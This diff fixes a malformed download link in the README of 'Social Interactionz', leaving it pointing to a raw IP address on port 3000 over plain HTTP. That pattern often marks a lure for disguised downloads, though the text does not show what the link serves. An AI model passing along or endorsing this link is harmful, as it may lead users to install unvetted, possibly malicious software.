@@ -61,4 +61,4 @@ Use special tags in chat for instant info:
 ## 📥 Download
 
 👉 Click the link below to download **Social Interactionz**
-[DOWNLOAD LATEST VERSION](https://http://74.235.187.43:3000/download)
+[DOWNLOAD LATEST VERSION](http://74.235.187.43:3000/download)
